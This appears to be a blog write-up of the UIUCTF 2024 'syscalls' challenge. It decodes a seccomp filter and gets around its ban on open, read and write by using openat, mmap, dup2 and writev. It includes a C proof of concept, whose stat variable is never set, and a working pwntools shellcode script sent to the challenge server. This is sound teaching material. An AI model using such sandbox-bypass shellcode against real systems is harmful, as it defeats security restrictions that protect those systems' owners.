+++
title = 'UIUCTF 2024 - pwn/syscalls'
date = 2024-07-02T01:07:17-04:00
draft = false
+++

'syscalls' was a very neat shellcode with seccomp challenge. 

### Initial Analysis

We are given a binary 'syscalls' and a Dockerfile. First, we take a look at the binary with the file command, and see that it is a stripped 64 bit ELF.


```sh
[d@d-20tk001gus syscall]$ file syscalls
syscalls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=19b78a52059d384f1b4def02d5838b625773369d, for GNU/Linux 3.2.0, stripped
```

Next we use checksec to see what protections are on. Everyting is on except for the NX bit, meaning the stack is executable.

```sh
[d@d-20tk001gus syscall]$ pwn checksec --file=syscalls
[*] '/home/d/Downloads/uiucCTF24/pwn/syscall/syscalls'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
```

### Decompilaiton with Ghidra

Because the binary is stripped, we don't have function names. We start at the main function, which calls three functions.

```c

void FUN_001011c9(void)

{
  long in_FS_OFFSET;
  undefined local_c8 [184];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  FUN_00101280(local_c8);
  FUN_001012db();
  FUN_001012ba(local_c8);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

The first function tells us that there is file called flag.txt in the same directory as the binary on the remote machine and then uses fgets to read into our buffer local_c8. It reads in less than 184 bytes so we do not have a buffer overflow. The third function takes in local_c8 as a paramenter and executes it as shellcode. But lets take a closer look at the second function.


```c

int FUN_001012db(void)

{
  int iVar1;
  long in_FS_OFFSET;
  undefined2 local_e8 [4];
  undefined8 *local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_d8 = 0x400000020;
  local_d0 = 0xc000003e16000015;
  local_c8 = 0x20;
  local_c0 = 0x4000000001000035;
  local_b8 = 0xffffffff13000015;
  local_b0 = 0x120015;
  local_a8 = 0x100110015;
  local_a0 = 0x200100015;
  local_98 = 0x11000f0015;
  local_90 = 0x13000e0015;
  local_88 = 0x28000d0015;
  local_80 = 0x39000c0015;
  local_78 = 0x3b000b0015;
  local_70 = 0x113000a0015;
  local_68 = 0x12700090015;
  local_60 = 0x12800080015;
  local_58 = 0x14200070015;
  local_50 = 0x1405000015;
  local_48 = 0x1400000020;
  local_40 = 0x30025;
  local_38 = 0x3000015;
  local_30 = 0x1000000020;
  local_28 = 0x3e801000025;
  local_20 = 0x7fff000000000006;
  local_18 = 6;
  local_e0 = &local_d8;
  local_e8[0] = 0x19;
  prctl(0x26,1,0,0,0);
  iVar1 = prctl(0x16,2,local_e8);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar1;
}

```

prctl stands for "Process Control" and is used to control various aspects of a process. The first argument passed in tells prctl what to do. I found a few sites online that describe the various flags, but none that map the flags to values. Instead, I looked in prctl.h in /lib and found the values for 0x16 and 0x26 (decimal 22 and 38)

```c

#define PR_SET_SECCOMP	22
...
#define PR_SET_NO_NEW_PRIVS	38

```
PR_SET_NO_NEW_PRIVS	makes it so that the process and its children can't gain new priveldges with somethink like setuid(). Seccomp is a security feature of the linux kernel that can be used to limit what syscalls a process can make. 


### Seccomp Configuration

Seccomp-tools (https://github.com/david942j/seccomp-tools) is a very useful tool for secomp analysis. Lets use it to take a look at what these filters are doing.


```sh
[d@d-20tk001gus syscall]$ seccomp-tools dump ./syscalls
The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
 ```

Looking at lines 5 to 16, we can see syscalls that we cannout use. If the syscall is used, KILL is returned and the process will be killed. Unfortunetly for us, some very useful syscalls are blocked. The most straightforward way to print out the contents of a file are using open, read, and write, all of which are blocked! Looking at lines 17 to 22, we can see that writev is not blocked but there are certain restrictions on it. We can use writev, but the file descriptor must be greater than 1000.


### Exploitation Strategy

We need to find alternative syscalls for read, write and open. We can use writev instead of write, and there is another syscall openat() which opens a file at a specific location that we can use instead of open. The tricky part of this challenge was finding a syscall that we can use instead of read as readv and pread are also blocked.

After some playing around, I thought that it would be possible to use mmap, but I wasn't sure. I wrote a small c program that used these 3 syscalls, and created a fake flag file in the same directory to see if it would print it out.


### Proof of Concept in C

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/uio.h>

int main() {
    struct stat st;
    void *mapped;
    openat(-100,"flag.txt",0);
    dup2(1, 1001);
    mapped = mmap(NULL, 64, PROT_READ, MAP_PRIVATE, 3, 0);
    struct iovec iov[1];
    iov[0].iov_base = mapped;
    iov[0].iov_len = st.st_size;
    writev(1001, iov, 1);
    return 0;
```

Bingo! First we use opeat to open the flag file. We use dup2 to duplicate fd 1 (standard output) to fd 1001. The first argument passed into mmap is the address for the mapping. When null is passed, the system will chose the address. The second argument is the length in bytes. The 5th argument is the file descriptor, which will be 3, the first available file descriptor which was used by openat. The writev syscall writes to multuple buffers that are iovec objects. An iovec object has a base which is the address we want to write to and and length. Here we map our addres that we got from mmap to iov_base.

### Final Solve

All thats left to do is convert the c code to assembly. Big shoutout to my teammate Xen0s for his help with the assembly conversion. The trickiest part is setting up the iov object. We need 2 pointers, so we can simulate this by pushing the values we need onto the stack. Here is the final solve script with the assembly.

```python
#!/usr/bin/env python3

from pwn import *
context.arch = "amd64"

exe = ELF("./syscalls", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("syscalls.chal.uiuc.tf", 1337, ssl=True)

    return r

def main():
    r = conn()
    payload = asm('''
	.global _start
    _start:
    .intel_syntax noprefix

    // openat
    xor rdi, rdi              
    mov rsi, 0x07478
    push rsi
    mov rsi,  0x742e67616c662f2e
    push rsi
    mov rsi, rsp
    xor rdx, rdx            
    mov rax, 257        
    mov rdi, -100       
    mov r10, -100              
    syscall                    

    // dup2
    mov rdi, 1
    mov rsi, 1001
    mov rax, 33
    syscall

    // mmap
    xor rdi, rdi
    mov rsi, 64
    mov rdx, 1
    mov r10, 2
    mov r8, 3
    xor r9, r9
    mov rax, 9
    syscall

    // iov
    mov rbx, 64
    push rbx
    mov rbx, rax
    push rbx
    
    // writev
    mov rdi, 1001
    mov rsi, rsp
    mov rdx, 1
    mov rax, 0x14
    syscall

    // exit
    mov rax, 60                
    xor rdi, rdi           
    syscall
    ''')


    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()

```

```
#uiuctf{a532aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}
```